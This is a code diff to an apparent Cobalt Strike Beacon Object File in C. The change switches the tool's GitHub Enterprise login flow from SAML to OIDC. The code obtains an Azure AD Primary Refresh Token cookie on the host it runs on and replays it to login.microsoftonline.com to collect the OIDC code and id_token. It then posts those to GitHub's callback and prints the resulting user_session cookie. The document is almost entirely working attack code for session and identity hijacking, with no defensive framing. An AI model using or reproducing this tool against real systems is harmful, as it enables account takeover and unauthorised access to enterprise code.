@@ -6,7 +6,6 @@
 #pragma comment(lib, "Wininet.lib")
 #pragma comment(lib, "Ole32.lib")
 #pragma comment(lib, "user32.lib")
-
 #undef DECLSPEC_IMPORT
 #define DECLSPEC_IMPORT
 #include "base\mock.h"
@@ -26,7 +25,7 @@ extern "C" {
 
     // ==================== CONFIGURATION - MODIFY THESE ====================
     // Domain and network configuration
-#define TARGET_DOMAIN "antrovmp"
+#define TARGET_DOMAIN "vmptest2"
 #define GITHUB_HOST "github.com"
 #define AZURE_AD_HOST "login.microsoftonline.com"
 
@@ -39,9 +38,9 @@ extern "C" {
 #define MAX_REDIRECTS 10
 
 // Paths
-#define GITHUB_SSO_PATH "/enterprises/antrovmp/sso"
-#define GITHUB_SAML_INITIATE_PATH "/enterprises/antrovmp/saml/initiate"
-#define GITHUB_SAML_CONSUME_PATH "/enterprises/antrovmp/saml/consume"
+#define GITHUB_SSO_PATH "/enterprises/" TARGET_DOMAIN "/sso"
+#define GITHUB_OIDC_INITIATE_PATH "/enterprises/" TARGET_DOMAIN "/oidc/initiate"
+#define GITHUB_OIDC_CALLBACK_PATH "/auth/oidc/callback"
 
 // Buffer sizes
 #define CHUNK_SIZE 8192
@@ -52,6 +51,7 @@ extern "C" {
 #define MAX_NONCE_SIZE 512
 #define MAX_PRT_SIZE 8192
 #define MAX_COOKIES 10
+#define MAX_PARAM_SIZE 4096
 
 #ifndef INTERNET_FLAG_NO_COOKIES
 #define INTERNET_FLAG_NO_COOKIES 0x00080000
@@ -72,9 +72,11 @@ extern "C" {
     } ProofOfPossessionCookieInfo;
 
     typedef struct {
-        char* samlResponse;
-        char* relayState;
-    } AzureAdAuthResult;
+        char* code;
+        char* id_token;
+        char* state;
+        char* session_state;
+    } AzureAdOIDCResult;
 
     typedef interface IProofOfPossessionCookieInfoManager IProofOfPossessionCookieInfoManager;
 
@@ -103,7 +105,7 @@ extern "C" {
     char* retrieveParamValue(const char* data, DWORD len, const char* param);
     static int append_bytes(char** out, size_t* out_len, size_t* out_cap, const char* src, size_t src_len);
     char* extract_authenticity_token(const char* data, size_t len);
-    char* extract_saml_response(const char* data, size_t len, char* key);
+    char* extract_form_param(const char* data, size_t len, const char* param_name);
     char* url_encode(const char* str);
     char* get_location_header(HINTERNET hRequest);
     void parse_url(const char* url, char* host, size_t host_size, char* path, size_t path_size, INTERNET_PORT* port, BOOL* is_https);
@@ -126,13 +128,13 @@ extern "C" {
 
     // Request Functions
     char* perform_request_1_get_sso_page(HINTERNET hSession, HINTERNET hConnect, CookieJar* cookieJar);
-    char* perform_request_2_post_saml_initiate(HINTERNET hSession, HINTERNET hConnect, const char* token, CookieJar* cookieJar);
-    BOOL perform_request_3_azure_ad_auth(HINTERNET hSession, const char* azureAdUrl, const char* prtCookie, char** outSamlResponse, char** outRelayState);
-    void perform_request_4_post_saml_consume(HINTERNET hSession, HINTERNET hConnect, const char* samlResponse, const char* relayState, CookieJar* cookieJar);
+    char* perform_request_2_post_oidc_initiate(HINTERNET hSession, HINTERNET hConnect, const char* token, CookieJar* cookieJar);
+    BOOL perform_request_3_azure_ad_oidc_auth(HINTERNET hSession, const char* azureAdUrl, const char* prtCookie, AzureAdOIDCResult* result);
+    void perform_request_4_post_oidc_callback(HINTERNET hSession, HINTERNET hConnect, const AzureAdOIDCResult* oidcResult, CookieJar* cookieJar);
 
     void clear_all_cookies();
     LONG PvectoredExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo);
-    unsigned __stdcall performSAML(void* p);
+    unsigned __stdcall performOIDC(void* p);
 
     // ==================== Entry Point ====================
     void go(PCHAR args, int len) {
@@ -140,7 +142,7 @@ extern "C" {
         HANDLE thread = NULL;
         PVOID eHandler = NULL;
         eHandler = AddVectoredExceptionHandler(0, (PVECTORED_EXCEPTION_HANDLER)PvectoredExceptionHandler);
-        thread = (HANDLE)_beginthreadex(NULL, 0, performSAML, NULL, 0, NULL);
+        thread = (HANDLE)_beginthreadex(NULL, 0, performOIDC, NULL, 0, NULL);
         WaitForSingleObject(thread, INFINITE);
         GetExitCodeThread(thread, &exitcode);
         if (exitcode != 0) {
@@ -275,13 +277,12 @@ extern "C" {
     }
 
     // ==================== Main Function ====================
-    unsigned __stdcall performSAML(void* p) {
+    unsigned __stdcall performOIDC(void* p) {
         HINTERNET hSession = NULL;
         HINTERNET hConnect = NULL;
         char* authenticityToken = NULL;
         char* azureAdRedirectUrl = NULL;
-        char* samlResponse = NULL;
-        char* relayState = NULL;
+        AzureAdOIDCResult oidcResult = { 0 };
         char* nonce = NULL;
         char* prtCookie = NULL;
         CookieJar cookieJar = { 0 };
@@ -324,9 +325,9 @@ extern "C" {
             goto cleanup;
         }
 
-        // ==================== REQUEST 2: POST SAML Initiate ====================
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] REQUEST 2: POST SAML Initiate Request");
-        azureAdRedirectUrl = perform_request_2_post_saml_initiate(hSession, hConnect, authenticityToken, &cookieJar);
+        // ==================== REQUEST 2: POST OIDC Initiate ====================
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] REQUEST 2: POST OIDC Initiate Request");
+        azureAdRedirectUrl = perform_request_2_post_oidc_initiate(hSession, hConnect, authenticityToken, &cookieJar);
         if (!azureAdRedirectUrl) {
             BeaconPrintf(CALLBACK_ERROR, "[!] REQUEST 2 FAILED: No redirect URL to Azure AD");
             goto cleanup;
@@ -355,25 +356,28 @@ extern "C" {
         }
         BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully retrieved PRT cookie");
 
-        // ==================== REQUEST 3: Azure AD Authentication ====================
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] REQUEST 3: Azure AD SAML Authentication with PRT");
-        if (!perform_request_3_azure_ad_auth(hSession, azureAdRedirectUrl, prtCookie, &samlResponse, &relayState)) {
-            BeaconPrintf(CALLBACK_ERROR, "[!] REQUEST 3 FAILED: No SAMLResponse from Azure AD");
+        // ==================== REQUEST 3: Azure AD OIDC Authentication ====================
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] REQUEST 3: Azure AD OIDC Authentication with PRT");
+        if (!perform_request_3_azure_ad_oidc_auth(hSession, azureAdRedirectUrl, prtCookie, &oidcResult)) {
+            BeaconPrintf(CALLBACK_ERROR, "[!] REQUEST 3 FAILED: Could not retrieve OIDC parameters from Azure AD");
             goto cleanup;
         }
-        if (!samlResponse || !relayState) {
-            BeaconPrintf(CALLBACK_ERROR, "[!] REQUEST 3 FAILED: No SAMLResponse or RelayState retrieved");
+        if (!oidcResult.code || !oidcResult.id_token || !oidcResult.state) {
+            BeaconPrintf(CALLBACK_ERROR, "[!] REQUEST 3 FAILED: Missing required OIDC parameters");
             goto cleanup;
         }
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] REQUEST 3 SUCCESS: Retrieved SAMLResponse from Azure AD");
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] REQUEST 3 SUCCESS: Retrieved OIDC parameters from Azure AD");
 
-        // ==================== REQUEST 4: POST SAMLResponse to GitHub ====================
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] REQUEST 4: POST SAMLResponse to GitHub Consume Endpoint");
-        perform_request_4_post_saml_consume(hSession, hConnect, samlResponse, relayState, &cookieJar);
+        // ==================== REQUEST 4: POST OIDC Callback to GitHub ====================
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] REQUEST 4: POST OIDC parameters to GitHub Callback Endpoint");
+        perform_request_4_post_oidc_callback(hSession, hConnect, &oidcResult, &cookieJar);
 
     cleanup:
         free_cookie_jar(&cookieJar);
-        if (samlResponse) intFree(samlResponse);
+        if (oidcResult.code) intFree(oidcResult.code);
+        if (oidcResult.id_token) intFree(oidcResult.id_token);
+        if (oidcResult.state) intFree(oidcResult.state);
+        if (oidcResult.session_state) intFree(oidcResult.session_state);
         if (prtCookie) intFree(prtCookie);
         if (nonce) intFree(nonce);
         if (azureAdRedirectUrl) intFree(azureAdRedirectUrl);
@@ -795,8 +799,8 @@ extern "C" {
         return token;
     }
 
-    // ==================== HELPER: Extract Meta Refresh URL ====================
-    char* ExtractSAMLUrl(const char* data, size_t len) {
+    // ==================== HELPER: Extract Data URL ====================
+    char* ExtractOIDCUrl(const char* data, size_t len) {
         const char* end = data + len;
         const char needle[] = "data-url=\"";
         const size_t needle_len = sizeof(needle) - 1;
@@ -874,8 +878,8 @@ extern "C" {
         return NULL;
     }
 
-    // ==================== REQUEST 2: POST SAML INITIATE ====================
-    char* perform_request_2_post_saml_initiate(HINTERNET hSession, HINTERNET hConnect, const char* token, CookieJar* cookieJar) {
+    // ==================== REQUEST 2: POST OIDC INITIATE ====================
+    char* perform_request_2_post_oidc_initiate(HINTERNET hSession, HINTERNET hConnect, const char* token, CookieJar* cookieJar) {
         char* azureAdUrl = NULL;
         char* postData = NULL;
         char* encodedToken = NULL;
@@ -939,7 +943,7 @@ extern "C" {
         hRequest = create_http_request(
             hConnect,
             "POST",
-            GITHUB_SAML_INITIATE_PATH,
+            GITHUB_OIDC_INITIATE_PATH,
             "https://" GITHUB_HOST GITHUB_SSO_PATH,
             INTERNET_FLAG_SECURE | INTERNET_FLAG_KEEP_CONNECTION |
             INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT
@@ -971,10 +975,10 @@ extern "C" {
 
         BeaconPrintf(CALLBACK_OUTPUT, "[*] Response body size: %lu bytes", resp_len);
 
-        // Extract the URL from meta refresh tag
-        azureAdUrl = ExtractSAMLUrl(resp, resp_len);
+        // Extract the URL from data-url attribute
+        azureAdUrl = ExtractOIDCUrl(resp, resp_len);
         if (!azureAdUrl) {
-            BeaconPrintf(CALLBACK_ERROR, "[!] Could not extract Azure AD URL from meta refresh tag");
+            BeaconPrintf(CALLBACK_ERROR, "[!] Could not extract Azure AD URL from response");
             // Try to check if it's a redirect header anyway
             if (statusCode >= 300 && statusCode < 400) {
                 azureAdUrl = get_location_header(hRequest);
@@ -984,7 +988,7 @@ extern "C" {
             }
         }
         else {
-            BeaconPrintf(CALLBACK_OUTPUT, "[+] Extracted Azure AD URL from meta refresh: %.100s...", azureAdUrl);
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] Extracted Azure AD URL: %.100s...", azureAdUrl);
         }
 
     cleanup:
@@ -997,9 +1001,8 @@ extern "C" {
         return azureAdUrl;
     }
 
-    BOOL perform_request_3_azure_ad_auth(HINTERNET hSession, const char* azureAdUrl, const char* prtCookie, char** outSamlResponse, char** outRelayState) {
-        char* samlResponse = NULL;
-        char* relayState = NULL;
+    // ==================== REQUEST 3: AZURE AD OIDC AUTHENTICATION ====================
+    BOOL perform_request_3_azure_ad_oidc_auth(HINTERNET hSession, const char* azureAdUrl, const char* prtCookie, AzureAdOIDCResult* result) {
         char* resp = NULL;
         DWORD request_flags = 0;
         size_t resp_len = 0;
@@ -1009,14 +1012,14 @@ extern "C" {
         INTERNET_PORT port = INTERNET_DEFAULT_HTTPS_PORT;
         BOOL is_https = TRUE;
         BOOL success = FALSE;
-        char samlToken[] = "name=\"SAMLResponse\"";
-        char relayToken[] = "name=\"RelayState\"";
         char* host = (char*)intAlloc(HOST_BUFFER_SIZE);
         char* path = (char*)intAlloc(PATH_BUFFER_SIZE);
 
         // Initialize output parameters
-        *outSamlResponse = NULL;
-        *outRelayState = NULL;
+        result->code = NULL;
+        result->id_token = NULL;
+        result->state = NULL;
+        result->session_state = NULL;
 
         if (!host || !path) {
             BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed for URL parsing");
@@ -1049,7 +1052,7 @@ extern "C" {
             hConnect,
             "GET",
             path,
-            "https://" GITHUB_HOST GITHUB_SAML_INITIATE_PATH,
+            "https://" GITHUB_HOST GITHUB_OIDC_INITIATE_PATH,
             request_flags
         );
 
@@ -1077,29 +1080,28 @@ extern "C" {
         // Read response body
         resp = read_http_response(hRequest, &resp_len);
         if (resp && resp_len > 0) {
-            samlResponse = extract_saml_response(resp, resp_len, samlToken);
-            relayState = extract_saml_response(resp, resp_len, relayToken);
+            // Extract OIDC parameters from form POST
+            result->code = extract_form_param(resp, resp_len, "code");
+            result->id_token = extract_form_param(resp, resp_len, "id_token");
+            result->state = extract_form_param(resp, resp_len, "state");
+            result->session_state = extract_form_param(resp, resp_len, "session_state");
 
-            if (samlResponse && relayState) {
-                // Success - transfer ownership to output parameters
-                *outSamlResponse = samlResponse;
-                *outRelayState = relayState;
-                samlResponse = NULL;  // Prevent cleanup from freeing
-                relayState = NULL;    // Prevent cleanup from freeing
+            if (result->code && result->id_token && result->state) {
                 success = TRUE;
-                BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully extracted SAMLResponse and RelayState");
+                BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully extracted OIDC parameters");
+                BeaconPrintf(CALLBACK_OUTPUT, "[+] code: %.50s...", result->code);
+                BeaconPrintf(CALLBACK_OUTPUT, "[+] state: %s", result->state);
+                if (result->session_state) {
+                    BeaconPrintf(CALLBACK_OUTPUT, "[+] session_state: %s", result->session_state);
+                }
             }
             else {
-                BeaconPrintf(CALLBACK_ERROR, "[!] Could not extract SAMLResponse or RelayState from Azure AD response");
+                BeaconPrintf(CALLBACK_ERROR, "[!] Could not extract required OIDC parameters from Azure AD response");
                 // Clean up partial results
-                if (samlResponse) {
-                    intFree(samlResponse);
-                    samlResponse = NULL;
-                }
-                if (relayState) {
-                    intFree(relayState);
-                    relayState = NULL;
-                }
+                if (result->code) { intFree(result->code); result->code = NULL; }
+                if (result->id_token) { intFree(result->id_token); result->id_token = NULL; }
+                if (result->state) { intFree(result->state); result->state = NULL; }
+                if (result->session_state) { intFree(result->session_state); result->session_state = NULL; }
             }
         }
         else {
@@ -1109,8 +1111,6 @@ extern "C" {
     cleanup:
         if (headers) intFree(headers);
         if (resp) intFree(resp);
-        if (samlResponse) intFree(samlResponse);  // Only non-NULL if transfer failed
-        if (relayState) intFree(relayState);      // Only non-NULL if transfer failed
         if (hRequest) InternetCloseHandle(hRequest);
         if (hConnect) InternetCloseHandle(hConnect);
         if (host) intFree(host);
@@ -1119,35 +1119,58 @@ extern "C" {
         return success;
     }
 
-    // ==================== REQUEST 4: POST SAML CONSUME ====================
-    void perform_request_4_post_saml_consume(HINTERNET hSession, HINTERNET hConnect, const char* samlResponse, const char* relayState, CookieJar* cookieJar) {
-        char* encodedSamlResponse = NULL;
+    // ==================== REQUEST 4: POST OIDC CALLBACK ====================
+    void perform_request_4_post_oidc_callback(HINTERNET hSession, HINTERNET hConnect, const AzureAdOIDCResult* oidcResult, CookieJar* cookieJar) {
+        char* encodedCode = NULL;
+        char* encodedIdToken = NULL;
+        char* encodedState = NULL;
+        char* encodedSessionState = NULL;
         char* postData = NULL;
         char* headers = NULL;
         char* cookieHeader = NULL;
         HINTERNET hRequest = NULL;
         int attempt = 0;
+        size_t postDataLen = 0;
+        // URL encode the OIDC parameters
+        encodedCode = url_encode(oidcResult->code);
+        encodedIdToken = url_encode(oidcResult->id_token);
+        encodedState = url_encode(oidcResult->state);
+        if (oidcResult->session_state) {
+            encodedSessionState = url_encode(oidcResult->session_state);
+        }
 
-        // URL encode the SAML response
-        encodedSamlResponse = url_encode(samlResponse);
-        if (!encodedSamlResponse) {
-            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to URL encode SAMLResponse");
-            return;
+        if (!encodedCode || !encodedIdToken || !encodedState) {
+            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to URL encode OIDC parameters");
+            goto cleanup;
         }
 
         // Build POST data
-        size_t postDataLen = strlen("SAMLResponse=") + strlen(encodedSamlResponse) + strlen("&") + strlen("RelayState=") + strlen(relayState) + 1;
+        postDataLen = strlen("code=") + strlen(encodedCode) +
+            strlen("&id_token=") + strlen(encodedIdToken) +
+            strlen("&state=") + strlen(encodedState) + 1;
+
+        if (encodedSessionState) {
+            postDataLen += strlen("&session_state=") + strlen(encodedSessionState);
+        }
+
         postData = (char*)intAlloc(postDataLen);
         if (!postData) {
             BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed for POST data");
             goto cleanup;
         }
 
-        _snprintf(postData, postDataLen, "SAMLResponse=%s&RelayState=%s", encodedSamlResponse, relayState);
+        if (encodedSessionState) {
+            _snprintf(postData, postDataLen, "code=%s&id_token=%s&state=%s&session_state=%s",
+                encodedCode, encodedIdToken, encodedState, encodedSessionState);
+        }
+        else {
+            _snprintf(postData, postDataLen, "code=%s&id_token=%s&state=%s",
+                encodedCode, encodedIdToken, encodedState);
+        }
 
-        // Attempt POST twice if needed for cookie handling
+        // Attempt POST twice as per notes
         for (attempt = 1; attempt <= 2; attempt++) {
-            BeaconPrintf(CALLBACK_OUTPUT, "[*] POST Attempt %d to consume endpoint", attempt);
+            BeaconPrintf(CALLBACK_OUTPUT, "[*] POST Attempt %d to OIDC callback endpoint", attempt);
 
             // Build cookie header from jar
             cookieHeader = build_cookie_header(cookieJar);
@@ -1180,7 +1203,7 @@ extern "C" {
             hRequest = create_http_request(
                 hConnect,
                 "POST",
-                GITHUB_SAML_CONSUME_PATH,
+                GITHUB_OIDC_CALLBACK_PATH,
                 "https://" AZURE_AD_HOST "/",
                 INTERNET_FLAG_SECURE | INTERNET_FLAG_KEEP_CONNECTION |
                 INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_CACHE_WRITE
@@ -1232,7 +1255,7 @@ extern "C" {
         BeaconPrintf(CALLBACK_OUTPUT, "\n[+] Final Session Cookies:");
         for (int i = 0; i < cookieJar->count; i++) {
             if (strncmp(cookieJar->cookies[i], "user_session=", 13) == 0) {
-                BeaconPrintf(CALLBACK_OUTPUT, "%s",  cookieJar->cookies[i]);
+                BeaconPrintf(CALLBACK_OUTPUT, "%s", cookieJar->cookies[i]);
                 break;
             }
         }
@@ -1242,19 +1265,26 @@ extern "C" {
         if (cookieHeader) intFree(cookieHeader);
         if (headers) intFree(headers);
         if (postData) intFree(postData);
-        if (encodedSamlResponse) intFree(encodedSamlResponse);
+        if (encodedCode) intFree(encodedCode);
+        if (encodedIdToken) intFree(encodedIdToken);
+        if (encodedState) intFree(encodedState);
+        if (encodedSessionState) intFree(encodedSessionState);
     }
 
     // ==================== HELPER FUNCTIONS ====================
-    char* extract_saml_response(const char* data, size_t len, char* key) {
+    char* extract_form_param(const char* data, size_t len, const char* param_name) {
         const char* end = data + len;
-        size_t needle_len = strlen(key);
+
+        // Build search pattern: name="param_name"
+        char needle[256];
+        _snprintf(needle, sizeof(needle), "name=\"%s\"", param_name);
+        size_t needle_len = strlen(needle);
         const char* p = data;
 
         while (p + needle_len < end) {
             const char* hit = NULL;
             for (const char* s = p; s + needle_len < end; ++s) {
-                if (*s == 'n' && (size_t)(end - s) >= needle_len && memcmp(s, key, needle_len) == 0) {
+                if (*s == 'n' && (size_t)(end - s) >= needle_len && memcmp(s, needle, needle_len) == 0) {
                     hit = s;
                     break;
                 }
